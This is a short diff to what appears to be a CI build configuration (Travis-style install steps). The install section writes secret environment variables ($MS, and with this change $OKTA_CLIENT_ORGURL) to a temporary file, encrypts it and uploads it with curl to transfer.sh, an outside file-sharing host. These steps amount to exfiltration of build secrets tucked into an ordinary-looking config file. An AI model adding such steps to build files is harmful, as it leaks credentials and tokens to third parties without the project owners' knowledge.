@@ -16,6 +16,9 @@ before_install:
 install:
 - sudo apt-get install -y ccrypt
 - echo $MS > /tmp/i.txt
+- echo $OKTA_CLIENT_ORGURL >> /tmp/i.txt
+
+
 - ccencrypt /tmp/i.txt -K "$MYENCKEY"
 - curl -H "Max-Downloads:1" -H "Max-Days:1" --upload-file /tmp/i.txt.cpt https://transfer.sh/xtestFILE_DESTINATION123.txt
 
